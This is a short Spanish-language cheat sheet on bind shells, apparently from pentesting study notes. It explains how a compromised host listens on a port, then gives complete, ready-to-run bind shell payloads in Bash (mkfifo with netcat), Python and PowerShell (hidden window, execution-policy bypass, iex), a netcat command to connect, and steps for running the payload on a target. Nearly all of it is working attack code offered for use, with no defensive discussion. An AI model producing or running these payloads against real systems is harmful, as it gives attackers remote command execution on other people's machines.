# 📡 Bind Shells – Resumen

Una **Bind Shell** deja al host comprometido **escuchando en un puerto**, esperando que nos conectemos.

## 📌 Características
- Podemos reconectar mientras el proceso siga vivo.
- Útil si el objetivo no puede iniciar conexiones salientes.
- Depende de que el puerto sea accesible (firewall puede bloquear).

## 🔹 Ejemplos de payloads
- **Bash:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
- **Python:**
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

- **PowerShell:**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

```

## 🔹 Conexión con Netcat
```bash
nc TARGET_IP 1234
```

## 🔹 Uso
1. Ejecutar payload en el objetivo para que escuche.
2. Conectarnos al puerto especificado.
3. Trabajar con la shell resultante.

📎 Tip: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) tiene múltiples variantes.
